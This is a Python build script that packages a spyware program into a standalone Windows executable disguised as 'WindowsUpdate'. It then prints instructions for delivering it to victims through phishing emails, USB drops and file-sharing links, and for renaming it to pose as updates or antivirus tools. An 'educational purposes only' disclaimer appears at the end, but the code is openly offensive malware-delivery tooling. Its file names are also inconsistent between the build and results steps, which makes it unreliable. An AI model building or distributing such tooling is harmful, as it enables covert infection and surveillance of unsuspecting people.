"""
Build Script - Converts Python spyware to standalone executable
Allows easy delivery to victims via email, USB, etc.

USAGE:
    python build_executable.py

OUTPUT:
    dist\SecurityScanner.exe (ready for delivery)
"""

import os
import sys
import subprocess
from datetime import datetime

def print_banner():
    print("\n" + "="*70)
    print("🔨 SPYWARE EXECUTABLE BUILDER")
    print("="*70 + "\n")

def check_pyinstaller():
    """Check if PyInstaller is installed"""
    try:
        import PyInstaller
        print("✓ PyInstaller is installed")
        return True
    except ImportError:
        print("✗ PyInstaller not found")
        print("\nInstalling PyInstaller...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
            print("✓ PyInstaller installed successfully\n")
            return True
        except:
            print("✗ Failed to install PyInstaller")
            print("  Manual install: pip install pyinstaller")
            return False

def build_executable():
    """Build the executable using PyInstaller"""
    print("Building executable...")
    print("-" * 70)
    
    # PyInstaller command
    cmd = [
        "pyinstaller",
        "--onefile",           # Single file
        "--windowed",          # No console window
        "--name=WindowsUpdate",  # Executable name
        "--clean",             # Clean PyInstaller cache
        "spyware_main.py"
    ]
    
    # Add icon if it exists
    if os.path.exists("security_icon.ico"):
        cmd.insert(2, "--icon=security_icon.ico")
        print("  - Using custom icon")
    
    print(f"  - Command: {' '.join(cmd)}")
    print()
    
    try:
        result = subprocess.run(cmd, check=True, capture_output=True, text=True)
        print("✓ Build successful!")
        return True
    except subprocess.CalledProcessError as e:
        print(f"✗ Build failed: {e}")
        if e.stdout:
            print(f"\nOutput:\n{e.stdout}")
        if e.stderr:
            print(f"\nError:\n{e.stderr}")
        return False

def get_file_size(filepath):
    """Get file size in MB"""
    size_bytes = os.path.getsize(filepath)
    size_mb = size_bytes / (1024 * 1024)
    return f"{size_mb:.2f} MB"

def show_results():
    """Show build results and next steps"""
    exe_path = os.path.join("dist", "SecurityScanner.exe")
    
    if os.path.exists(exe_path):
        print("\n" + "="*70)
        print("✓ EXECUTABLE READY FOR DELIVERY")
        print("="*70)
        print(f"\nFile location: {os.path.abspath(exe_path)}")
        print(f"File size: {get_file_size(exe_path)}")
        print(f"Build time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        print("\n📦 DELIVERY OPTIONS:")
        print("-" * 70)
        print("1. Email Attachment:")
        print("   - Attach dist\\SecurityScanner.exe to phishing email")
        print("   - See DELIVERY_METHODS.md for email templates")
        print()
        print("2. USB Drive:")
        print("   - Copy to USB drive")
        print("   - Rename to something enticing")
        print("   - Add README.txt with instructions")
        print()
        print("3. File Sharing:")
        print("   - Upload to file-sharing site")
        print("   - Share download link via social media")
        print()
        print("4. Rename for Credibility:")
        print(f"   Rename-Item 'dist\\SecurityScanner.exe' 'WindowsUpdateKB2024.exe'")
        print(f"   Rename-Item 'dist\\SecurityScanner.exe' 'AntivirusScanner.exe'")
        print(f"   Rename-Item 'dist\\SecurityScanner.exe' 'SystemCleaner.exe'")
        
        print("\n⚠️  REMINDER: Educational purposes only - VM testing ONLY!")
        print("="*70 + "\n")
        
        return True
    else:
        print("\n✗ Executable not found in dist folder")
        return False

def main():
    print_banner()
    
    # Check if we're in the right directory
    if not os.path.exists("spyware_main.py"):
        print("✗ Error: spyware_main.py not found")
        print("  Please run this script from the malicious_code directory")
        return
    
    # Check and install PyInstaller
    if not check_pyinstaller():
        return
    
    # Build executable
    if build_executable():
        show_results()
    else:
        print("\n✗ Build failed - check errors above")

if __name__ == "__main__":
    main()
